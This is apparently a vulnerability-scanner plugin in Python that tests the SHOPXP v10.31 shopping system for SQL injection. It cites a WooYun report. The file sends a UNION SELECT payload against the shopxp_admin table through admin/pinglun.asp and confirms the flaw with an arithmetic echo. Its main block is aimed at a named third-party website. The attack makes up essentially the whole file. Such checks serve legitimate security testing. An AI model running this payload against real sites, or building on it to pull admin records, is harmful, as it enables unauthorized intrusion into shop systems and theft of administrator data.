# !/usr/bin/dev python
# -*- coding:utf-8 -*-
#_Author_= 7d0y
#_PlugName_ = SHOPXP网上购物系统 v10.31 注入漏洞
#_FileName_ = shopxp.py
#_Refer= http://www.wooyun.org/bugs/wooyun-2014-087751

import re
import time
import math

def assign(service, arg):
    if service == "shopxp":
        return True, arg

def audit(args):
    payload = "admin/pinglun.asp?id=1%20and%201=2%20union%20select%201,2,88888-22222,1,1,1,1,1,1,1,1%20from%20shopxp_admin"
    verify_url = args + payload
    code, head,res, errcode, _ = curl.curl(verify_url)
    if code == 200 and "66666" in res:
        security_hole(verify_url)     
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('shopxp', 'http://www.outlanderex.com/')[1])
